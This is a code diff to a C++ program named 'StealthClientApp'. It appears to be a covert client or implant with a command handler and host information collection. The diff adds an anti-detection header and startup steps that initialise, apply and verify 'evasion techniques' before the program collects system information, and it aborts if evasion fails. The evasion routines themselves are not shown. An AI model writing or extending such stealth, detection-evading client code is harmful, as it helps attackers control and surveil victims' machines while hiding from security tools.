@@ -10,6 +10,7 @@
 #include "command_handler.h"
 #include "system_info.h"
 #include "json_utils.h"
+#include "anti_detection.h"
 
 class StealthClientApp {
 public:
@@ -28,8 +29,32 @@ public:
 
     bool Start() {
         std::cout << "==========================================" << std::endl;
-        std::cout << "🚀 STEALTH CLIENT STARTING UP!" << std::endl;
+        std::cout << "🚀 ENHANCED STEALTH CLIENT STARTING UP!" << std::endl;
         std::cout << "==========================================" << std::endl;
+
+        // Initialize anti-detection evasion system FIRST
+        std::cout << "[DEBUG] Initializing anti-detection evasion system..." << std::endl;
+        if (!StealthClient::InitializeEvasion()) {
+            std::cerr << "[ERROR] Failed to initialize evasion system - aborting" << std::endl;
+            return false;
+        }
+        
+        // Apply all evasion techniques
+        std::cout << "[DEBUG] Applying evasion techniques..." << std::endl;
+        if (!StealthClient::ApplyEvasionTechniques()) {
+            std::cerr << "[ERROR] Failed to apply evasion techniques - aborting" << std::endl;
+            return false;
+        }
+        
+        // Verify evasion is working
+        std::cout << "[DEBUG] Verifying evasion techniques..." << std::endl;
+        if (!StealthClient::VerifyEvasion()) {
+            std::cerr << "[ERROR] Evasion verification failed - aborting" << std::endl;
+            return false;
+        }
+        
+        std::cout << "[DEBUG] Anti-detection evasion system active" << std::endl;
+        std::cout << StealthClient::GetEvasionSummary() << std::endl;
 
         // Collect system information
         m_systemInfo = StealthClient::SystemInfoCollector::CollectSystemInfo();
